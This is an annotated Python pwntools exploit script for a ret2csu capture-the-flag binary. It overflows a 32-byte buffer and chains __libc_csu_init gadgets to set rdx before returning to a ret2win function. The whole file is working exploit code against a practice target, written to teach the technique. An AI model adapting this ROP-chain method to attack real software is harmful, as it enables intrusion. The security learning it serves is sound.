import pwn
import struct

# ret2csu is a 64-bit dynamically-linked binary
# NX is enabled, ASLR is on

# This is a very basic example of using gadgets from the __libc_csu_init function

# We are unable to do a ret2libc, and we don't have a wide selection of rop gadgets, so
# we have to use gadgets from __libc_csu_init to put a custom value in the rdx
# register, before returning to a ret2win function
# The only difficulty is the __libc_csu_init gadgets are a bit clunky, so constructing the stack
# is harder than trivial

target = pwn.process('./ret2csu')

# The target binary is very simple, it tells us exactly what we need to do
# It scans 176 bytes of our input into a 32 byte space, and tells us that
# to get the flag, we must call ret2win with rdx = 0xdeadcafebabebeef

# There are two things that make this more difficult than it should be
# First, the binary is somewhat small, so we do not have gadgets that let us move a value into rdx
# You can see this with:
# ropper --file ret2csu | grep rdx

# Second, the binary zeroes out the GOT addresses for puts, printf, and memset right before it takes our input
# This means we will be unable to do a puts(puts got) style leak for a ret2libc/getting gadgets from libc

# The solution is to use gadgets from __libc_csu_init

############################
#### Ret 2 CSU Overview ####
############################

# This is actually a really simple concept.
# Basically the __libc_csu_init function is responsible for initializing the libc file
# We can use its contents as bonus rop gadgets essentially

# For non-stripped binaries, you can find the __libc_csu_init function in the functions panel in ghidra
# I think it will always be the exact same

# For this challenge, there are two sections which we can use as gadgets
# 1)
#        0040089a 5b              POP        RBX
#        0040089b 5d              POP        RBP
#        0040089c 41 5c           POP        R12
#        0040089e 41 5d           POP        R13
#        004008a0 41 5e           POP        R14
#        004008a2 41 5f           POP        R15
#        004008a4 c3              RET
csu_gadget_1 = struct.pack("<Q", 0x40089a)

# 2)
#        00400880 4c 89 fa        MOV        RDX,R15
#        00400883 4c 89 f6        MOV        RSI,R14
#        00400886 44 89 ef        MOV        EDI,R13D
#        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
#
#        0040088d 48 83 c3 01     ADD        RBX,0x1
#        00400891 48 39 dd        CMP        RBP,RBX
#        00400894 75 ea           JNZ        LAB_00400880
#
#        00400896 48 83 c4        ADD        RSP,0x8
#        0040089a 5b              POP        RBX
#           .....
csu_gadget_2 = struct.pack("<Q", 0x400880)

# (1) will allow us to control various registers
# (2) will allow us to control rdx, rsi, and edi
# (2) is not really a gadget though, because it doesn't end in ret,
# It doesn't actually ret for a very long time, it will go all the wasy to 004008a4, the same place that (1) rets!
# We will have to find a way to satisfy it basically
# First, we have to figure out a way to call some other function that quickly rets with that call instruction at 00400889
# A good option for this function is the _init function, at address 0x400560

# The instruction is call [r12] not call r12
# So we actually need a pointer to 0x400560, instead of just 0x400560
# We can look for such a pointer in gdb with:
# search-pattern 0x400560
# We get two options for pointers, both of them work
init_ptr = struct.pack("<Q", 0x400e38)

# Second, at 00400891 rbp and rbx are compared, after rbx is incremented by 1
# We need them to be equal, otherwise we will jump away, which we do not want
# Then, we will just need to properly put garbage on the stack to satisfy all the pops

# Distance to return address
payload = b'a' * 40

# First gadget, and the values that will be popped off the stack
payload += csu_gadget_1
payload += struct.pack("<Q", 0x0) # rbx
payload += struct.pack("<Q", 0x1) # rbp -> so rbx + 1 = rbp at 00400891
payload += init_ptr # r12, will be called in 'call qword ptr [R12 + RBX*0x8]
payload += struct.pack("<Q", 0x0) # r13
payload += struct.pack("<Q", 0x0) # r14
payload += struct.pack("<Q", 0xdeadcafebabebeef) # r15 > soon to be rdx

# Second gadget, and the corresponding stack values
payload += csu_gadget_2
# qword value for the add rsp, 0x8 adjustment (add rsp 0x8 essentially acts like a pop trashcan instruction)
payload += struct.pack("<Q", 0x0) 
payload += struct.pack("<Q", 0x0) # rbx
payload += struct.pack("<Q", 0x0) # rbp
payload += struct.pack("<Q", 0x0) # r12
payload += struct.pack("<Q", 0x0) # r13
payload += struct.pack("<Q", 0x0) # r14
payload += struct.pack("<Q", 0x0) # r15

#################
#### ret2win ####
#################

# Now, we should have 0xdeadcafebabebeef in rdx,
# All thats left to do is to put the address of ret2win at the end of our rop chain

# Address of ret2win
ret2win_addr = struct.pack("<Q", 0x4007b1)

payload += ret2win_addr

target.sendline(payload)
target.recvuntil(b'must be 0xdeadcafebabebeef\n\n> ')
flag = target.recv()
print(f"flag: {flag.decode()}")